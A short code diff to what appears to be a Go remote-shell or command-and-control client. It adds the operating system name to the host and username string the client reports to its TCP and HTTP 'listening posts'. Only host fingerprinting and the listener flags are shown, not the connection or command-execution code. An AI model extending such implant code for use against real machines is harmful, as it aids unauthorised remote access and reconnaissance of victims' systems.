@@ -7,6 +7,7 @@ import (
    "strings"
    "os"
    "os/user"
+   "runtime"
    "time"
    "flag"
 
@@ -54,7 +55,8 @@ func handshake(conn net.Conn) bool{
 func main() {
    host, _ := os.Hostname()
    user, _ := user.Current()
-   shellInfo = fmt.Sprintf("%s$%s", host, user.Username)
+   platform := runtime.GOOS
+   shellInfo = fmt.Sprintf("%s$%s$%s", host, user.Username, platform)
 
    tcp := flag.String("tcp", "127.0.0.1:5678", "The IP of the TCP listening post")
    http := flag.String("http", "http://127.0.0.1:8888", "The IP of the HTTP listening post")
